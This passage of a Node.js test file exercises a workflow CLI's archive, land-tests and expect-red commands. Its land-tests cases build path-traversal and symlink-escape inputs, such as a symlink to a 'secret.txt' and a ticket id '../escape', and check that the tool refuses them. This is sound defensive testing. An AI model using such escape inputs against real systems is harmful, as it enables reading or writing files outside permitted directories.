  assertRejected(cli(['archive'].concat(gflags(sb), ['--unit', unitDir(sb, id)])), 'archive-not-ready');
});

test('archive refuses an existing target', () => {
  const { sb, id } = shipUnit();
  put(sb, id, 'handoff.md');
  fs.mkdirSync(path.join(sb.archive, id), { recursive: true });
  assert.equal(cli(['archive'].concat(gflags(sb), ['--unit', unitDir(sb, id)])).code, 6);
});

test('after the archive line, no further writes are accepted', () => {
  const { sb, id } = shipUnit();
  const r = write(sb, id, (s) => { s.outcome_reason = null; }, [{}]);
  assertRejected(r, 'frozen');
});

test('an abandoned unit ends at the abandonment terminal with a reason', () => {
  const { sb, id } = forkBuildDirect();
  ok(write(sb, id, (s) => { s.current_node = 'end'; s.walked_path.push('end'); s.current_task = 'archive-abandoned'; s.outcome = 'ended'; s.outcome_reason = 'human cancelled'; }, [{}]));
});

test('not-needed at the phase approval ends the unit before any phase is recorded', () => {
  const sb = sandbox();
  create(sb, 'nn');
  ok(routeTo(sb, 'nn', 'research', 'approve-phase'));
  put(sb, 'nn', 'research/decision-1.md');
  ok(write(sb, 'nn', (s) => {
    s.current_node = 'end'; s.walked_path.push('end'); s.current_task = null; s.outcome = 'ended'; s.outcome_reason = 'not needed';
    s.human_decisions.push({ id: 'H-1', kind: 'approval', node: 'research', decision: 'not-needed', phase: null, target: null, file: 'research/decision-1.md', date: T0 });
  }, [{ event_type: 'human-decision', node: 'research' }, { node: 'end', event_type: 'route' }]));
});

test('stdout is exactly one JSON object on success and on failure', () => {
  const sb = sandbox();
  const good = create(sb, 'one');
  assert.equal(good.stdout.trim().split('\n').length, 1);
  const bad = cli(['validate'].concat(gflags(sb), ['--unit', path.join(sb.dir, 'none')]));
  assert.equal(bad.stdout.trim().split('\n').length, 1);
  assert.equal(JSON.parse(bad.stdout).ok, false);
});

// ---------------------------------------------------------------------------
// land-tests

function landArgs(sb, id, wt, ticket, extra) {
  return ['land-tests'].concat(gflags(sb), ['--unit', unitDir(sb, id), '--worktree', wt, '--ticket', ticket], extra || []);
}

function worktreeOf(sb) {
  const wt = path.join(sb.dir, 'wt');
  fs.mkdirSync(wt, { recursive: true });
  return wt;
}

test('land-tests copies the ticket test tree to the worktree at the declared paths, sorted, and is idempotent', () => {
  const { sb, id } = forkBuild();
  put(sb, id, 'ticket/tests/T-1/test/foo.test.js', 'foo v1\n');
  put(sb, id, 'ticket/tests/T-1/test/deep/bar.test.js', 'bar v1\n');
  put(sb, id, 'ticket/tests/T-1/README.txt', 'top\n');
  put(sb, id, 'ticket/tests/T-2/test/other.test.js', 'not ours\n');
  const wt = worktreeOf(sb);
  fs.mkdirSync(path.join(wt, 'test'));
  fs.writeFileSync(path.join(wt, 'test', 'keep.js'), 'untouched\n');
  const r = cli(landArgs(sb, id, wt, 'T-1'));
  assert.equal(r.code, 0, r.stdout);
  assert.equal(r.json.ok, true);
  assert.equal(r.json.action, 'tests-landed');
  assert.equal(r.json.ticket, 'T-1');
  assert.equal(r.json.source, path.join(unitDir(sb, id), 'ticket', 'tests', 'T-1'));
  assert.deepEqual(r.json.files, ['README.txt', 'test/deep/bar.test.js', 'test/foo.test.js']);
  assert.equal(fs.readFileSync(path.join(wt, 'test', 'foo.test.js'), 'utf8'), 'foo v1\n');
  assert.equal(fs.readFileSync(path.join(wt, 'test', 'deep', 'bar.test.js'), 'utf8'), 'bar v1\n');
  assert.equal(fs.readFileSync(path.join(wt, 'README.txt'), 'utf8'), 'top\n');
  assert.equal(fs.readFileSync(path.join(wt, 'test', 'keep.js'), 'utf8'), 'untouched\n');
  assert.equal(fs.existsSync(path.join(wt, 'test', 'other.test.js')), false, 'another ticket\'s tests are not landed');
  // idempotent: the same call again overwrites, even a locally modified copy
  fs.writeFileSync(path.join(wt, 'test', 'foo.test.js'), 'tampered\n');
  const again = cli(landArgs(sb, id, wt, 'T-1'));
  assert.equal(again.code, 0, again.stdout);
  assert.deepEqual(again.json.files, r.json.files);
  assert.equal(fs.readFileSync(path.join(wt, 'test', 'foo.test.js'), 'utf8'), 'foo v1\n');
  // the stage directory itself is untouched
  assert.equal(fs.readFileSync(path.join(unitDir(sb, id), 'ticket', 'tests', 'T-1', 'test', 'foo.test.js'), 'utf8'), 'foo v1\n');
});

test('land-tests: a missing, empty, or file-less source is not_found', () => {
  const { sb, id } = forkBuild();
  const wt = worktreeOf(sb);
  const missing = cli(landArgs(sb, id, wt, 'T-2'));
  assert.equal(missing.code, 5, missing.stdout);
  assert.equal(missing.json.error, 'not_found');
  assert.match(missing.json.message, /T-2/);
  fs.mkdirSync(path.join(unitDir(sb, id), 'ticket', 'tests', 'T-2'), { recursive: true });
  assert.equal(cli(landArgs(sb, id, wt, 'T-2')).code, 5, 'an empty directory declares nothing');
  fs.mkdirSync(path.join(unitDir(sb, id), 'ticket', 'tests', 'T-2', 'test', 'sub'), { recursive: true });
  assert.equal(cli(landArgs(sb, id, wt, 'T-2')).code, 5, 'only empty subdirectories declare nothing');
  assert.deepEqual(fs.readdirSync(wt), [], 'nothing landed');
});

test('land-tests: a ticket the unit does not hold is a state failure naming it', () => {
  const { sb, id } = forkBuild();
  const wt = worktreeOf(sb);
  const r = cli(landArgs(sb, id, wt, 'T-9'));
  assert.equal(r.code, 3, r.stdout);
  assert.equal(r.json.error, 'state');
  assert.match(r.json.message, /T-9/);
  // a unit that never reached the ticket node has no items at all
  const chore = forkBuildDirect();
  const c = cli(landArgs(chore.sb, chore.id, worktreeOf(chore.sb), 'T-1'));
  assert.equal(c.code, 3);
  assert.match(c.json.message, /T-1/);
});

test('land-tests: the worktree must be an existing directory', () => {
  const { sb, id } = forkBuild();
  put(sb, id, 'ticket/tests/T-1/a.test.js');
  const gone = cli(landArgs(sb, id, path.join(sb.dir, 'no-such-wt'), 'T-1'));
  assert.equal(gone.code, 5);
  const file = path.join(sb.dir, 'a-file');
  fs.writeFileSync(file, 'x');
  assert.equal(cli(landArgs(sb, id, file, 'T-1')).code, 5);
});

test('land-tests refuses a symlink in the declared tree and lands nothing', () => {
  const { sb, id } = forkBuild();
  put(sb, id, 'ticket/tests/T-1/good.test.js');
  fs.writeFileSync(path.join(sb.dir, 'secret.txt'), 'secret');
  fs.symlinkSync(path.join(sb.dir, 'secret.txt'), path.join(unitDir(sb, id), 'ticket', 'tests', 'T-1', 'link.test.js'));
  const wt = worktreeOf(sb);
  const r = cli(landArgs(sb, id, wt, 'T-1'));
  assert.equal(r.code, 3, r.stdout);
  assert.equal(r.json.error, 'state');
  assert.match(r.json.message, /symlink/);
  assert.deepEqual(fs.readdirSync(wt), []);
  // a symlinked directory, and a symlinked tests/<ticket> itself
  fs.rmSync(path.join(unitDir(sb, id), 'ticket', 'tests', 'T-1', 'link.test.js'));
  fs.mkdirSync(path.join(sb.dir, 'elsewhere'));
  fs.writeFileSync(path.join(sb.dir, 'elsewhere', 'x.test.js'), 'x');
  fs.symlinkSync(path.join(sb.dir, 'elsewhere'), path.join(unitDir(sb, id), 'ticket', 'tests', 'T-1', 'dir'));
  assert.equal(cli(landArgs(sb, id, wt, 'T-1')).code, 3);
  fs.mkdirSync(path.join(unitDir(sb, id), 'ticket', 'tests'), { recursive: true });
  fs.symlinkSync(path.join(sb.dir, 'elsewhere'), path.join(unitDir(sb, id), 'ticket', 'tests', 'T-2'));
  const t2 = cli(landArgs(sb, id, wt, 'T-2'));
  assert.equal(t2.code, 3);
  assert.deepEqual(fs.readdirSync(wt), []);
});

test('land-tests refuses destinations that would leave the worktree', () => {
  const { sb, id } = forkBuild();
  put(sb, id, 'ticket/tests/T-1/test/foo.test.js', 'foo\n');
  put(sb, id, 'ticket/tests/T-1/top.js', 'top\n');
  const wt = worktreeOf(sb);
  const outside = path.join(sb.dir, 'outside');
  fs.mkdirSync(outside);
  // the worktree's test/ is a symlink out of the worktree
  fs.symlinkSync(outside, path.join(wt, 'test'));
  const r = cli(landArgs(sb, id, wt, 'T-1'));
  assert.equal(r.code, 4, r.stdout);
  assert.equal(r.json.error, 'write_failed');
  assert.deepEqual(fs.readdirSync(outside), [], 'nothing was written outside the worktree');
  assert.equal(fs.existsSync(path.join(wt, 'top.js')), false, 'the check runs before any file is copied');
  // an existing destination that is itself a symlink is never written through
  fs.unlinkSync(path.join(wt, 'test'));
  fs.writeFileSync(path.join(sb.dir, 'target.txt'), 'orig');
  fs.mkdirSync(path.join(wt, 'test'));
  fs.symlinkSync(path.join(sb.dir, 'target.txt'), path.join(wt, 'test', 'foo.test.js'));
  assert.equal(cli(landArgs(sb, id, wt, 'T-1')).code, 4);
  assert.equal(fs.readFileSync(path.join(sb.dir, 'target.txt'), 'utf8'), 'orig');
  // a file standing where a directory is needed
  fs.rmSync(path.join(wt, 'test'), { recursive: true });
  fs.writeFileSync(path.join(wt, 'test'), 'a file');
  assert.equal(cli(landArgs(sb, id, wt, 'T-1')).code, 4);
});

test('land-tests refuses a ticket id that is not a single path segment', () => {
  const { sb, id } = forkBuild();
  const f = path.join(unitDir(sb, id), 'state.json');
  const s = readJson(f);
  s.tickets[0].id = '../escape';
  fs.writeFileSync(f, JSON.stringify(s));
  fs.mkdirSync(path.join(unitDir(sb, id), 'escape'), { recursive: true });
  fs.writeFileSync(path.join(unitDir(sb, id), 'escape', 'x.js'), 'x');
  const wt = worktreeOf(sb);
  const r = cli(landArgs(sb, id, wt, '../escape'));
  assert.equal(r.code, 3, r.stdout);
  assert.match(r.json.message, /single safe path segment/);
  assert.deepEqual(fs.readdirSync(wt), []);
});

// ---------------------------------------------------------------------------
// expect-red

// The gate keeps a ticket's command inside the mounted family, so the run-time cases forge it.
function withCommand(sb, id, cmd, ticket) {
  const f = path.join(unitDir(sb, id), 'state.json');
  const s = readJson(f);
  s.tickets.find((t) => t.id === (ticket || 'T-1')).verification_command = cmd;
  fs.writeFileSync(f, JSON.stringify(s));
}

function redArgs(sb, id, wt, ticket, extra) {
  return ['expect-red'].concat(gflags(sb), ['--unit', unitDir(sb, id), '--worktree', wt, '--ticket', ticket || 'T-1'], extra || []);
}

test('expect-red: a failing command is red-observed (exit 0) and reports command, status, signal, tail', () => {
  const { sb, id } = forkBuild();
  const cmd = 'echo to-out; echo to-err 1>&2; exit 3';
  withCommand(sb, id, cmd);
  const r = cli(redArgs(sb, id, worktreeOf(sb)));
  assert.equal(r.code, 0, r.stdout);
  assert.equal(r.json.ok, true);
  assert.equal(r.json.action, 'red-observed');
  assert.equal(r.json.ticket, 'T-1');
  assert.equal(r.json.command, cmd);
  assert.equal(r.json.exit_status, 3);
  assert.equal(r.json.signal, null);
  assert.match(r.json.output_tail, /to-out/);
  assert.match(r.json.output_tail, /to-err/);
  assert.equal(r.stdout.trim().split('\n').length, 1, 'the command output never leaks onto stdout');
});

test('expect-red: an already-green command is already_green, exit 11, with the same body fields', () => {
  const { sb, id } = forkBuild();
  withCommand(sb, id, 'echo fine; true');
  const r = cli(redArgs(sb, id, worktreeOf(sb)));
  assert.equal(r.code, 11, r.stdout);
  assert.equal(r.json.ok, false);
  assert.equal(r.json.error, 'already_green');
  assert.equal(r.json.ticket, 'T-1');
  assert.equal(r.json.command, 'echo fine; true');
  assert.equal(r.json.exit_status, 0);
  assert.equal(r.json.signal, null);
  assert.match(r.json.output_tail, /fine/);
});

test('expect-red: a command that cannot run (126, 127, unknown program, signal) is not_runnable, exit 12', () => {
  const { sb, id } = forkBuild();
  const wt = worktreeOf(sb);
  const run = (cmd) => { withCommand(sb, id, cmd); return cli(redArgs(sb, id, wt)); };
  const a = run('exit 127');
  assert.equal(a.code, 12, a.stdout);
  assert.equal(a.json.error, 'not_runnable');
  assert.equal(a.json.exit_status, 127);
  assert.equal(a.json.command, 'exit 127');
  const b = run('exit 126');
  assert.equal(b.code, 12);
  assert.equal(b.json.exit_status, 126);
  const c = run('definitely-not-a-program-xyz --flag');
  assert.equal(c.code, 12);
  assert.equal(c.json.exit_status, 127);
  assert.match(c.json.output_tail, /not found/);
  const d = run('kill -9 $$');
  assert.equal(d.code, 12, d.stdout);
  assert.equal(d.json.error, 'not_runnable');
  assert.equal(d.json.signal, 'SIGKILL');
  assert.equal(d.json.exit_status, null);
});

test('expect-red runs in the worktree with the inherited environment, and keeps the last 2000 characters', () => {
  const { sb, id } = forkBuild();
  const wt = worktreeOf(sb);
  withCommand(sb, id, 'touch ran-here; test "$WU_PROBE" = on || exit 9; exit 4');
  const r = cli(redArgs(sb, id, wt), { env: Object.assign({}, process.env, { WU_PROBE: 'on' }) });
  assert.equal(r.code, 0, r.stdout);
  assert.equal(r.json.exit_status, 4, 'the inherited variable reached the command');
  assert.ok(fs.existsSync(path.join(wt, 'ran-here')), 'cwd is the worktree');
  withCommand(sb, id, 'node -e "process.stdout.write(\'x\'.repeat(5000) + \'END\'); process.exit(1)"');
  const long = cli(redArgs(sb, id, wt));
  assert.equal(long.code, 0, long.stdout);
  assert.equal(long.json.output_tail.length, 2000);
  assert.ok(long.json.output_tail.endsWith('END'));
});

test('expect-red runs the named ticket\'s own command', () => {
  const { sb, id } = forkBuild();
  withCommand(sb, id, 'exit 1', 'T-1');
  withCommand(sb, id, 'true', 'T-2');
  const wt = worktreeOf(sb);
  assert.equal(cli(redArgs(sb, id, wt, 'T-1')).code, 0);
  assert.equal(cli(redArgs(sb, id, wt, 'T-2')).code, 11);
});

test('expect-red: an unknown ticket is a state failure; a missing worktree is not_found', () => {
  const { sb, id } = forkBuild();
  const r = cli(redArgs(sb, id, worktreeOf(sb), 'T-9'));
  assert.equal(r.code, 3);
  assert.match(r.json.message, /T-9/);
  const w = cli(redArgs(sb, id, path.join(sb.dir, 'no-such-wt')));
  assert.equal(w.code, 5);
});

test('expect-red: the ticket record must carry exactly one command-typed field (zero or several is a graph failure)', () => {
  const { sb, id } = forkBuild();
  const wt = worktreeOf(sb);
  const tickets = (fields) => Object.assign({}, SHIPPED.tickets, { items: { type: 'object', fields: fields } });
  const base = SHIPPED.tickets.items.fields;
  const plugin = (over) => {
    const file = path.join(sb.dir, 'plugin-' + (counter++) + '.json');
    fs.writeFileSync(file, JSON.stringify(Object.assign({}, SHIPPED, { tickets: over })));
    return file;
  };
  // two command-typed fields: the definition is valid, the ticket is ambiguous
  const two = plugin(tickets(Object.assign({}, base, { setup_command: { type: 'command' } })));
  const f = path.join(unitDir(sb, id), 'state.json');
  const s = readJson(f);
  s.tickets.forEach((t) => { t.setup_command = 'true'; });
  fs.writeFileSync(f, JSON.stringify(s));
  const a = cli(redArgs(sb, id, wt, 'T-1', ['--plugin-types', two]));
  assert.equal(a.code, 8, a.stdout);
  assert.equal(a.json.error, 'graph');
  assert.match(a.json.message, /exactly one command-typed field/);
  assert.match(a.json.message, /verification_command, setup_command/);
  // zero command-typed fields: the record's command is a plain string, which the definition (equipment draws on a command field) rejects
  const zero = plugin(tickets(Object.assign({}, base, { verification_command: { type: 'string' } })));
  const b = cli(redArgs(sb, id, wt, 'T-1', ['--plugin-types', zero]));
  assert.equal(b.code, 8, b.stdout);
  assert.equal(b.json.error, 'graph');
});
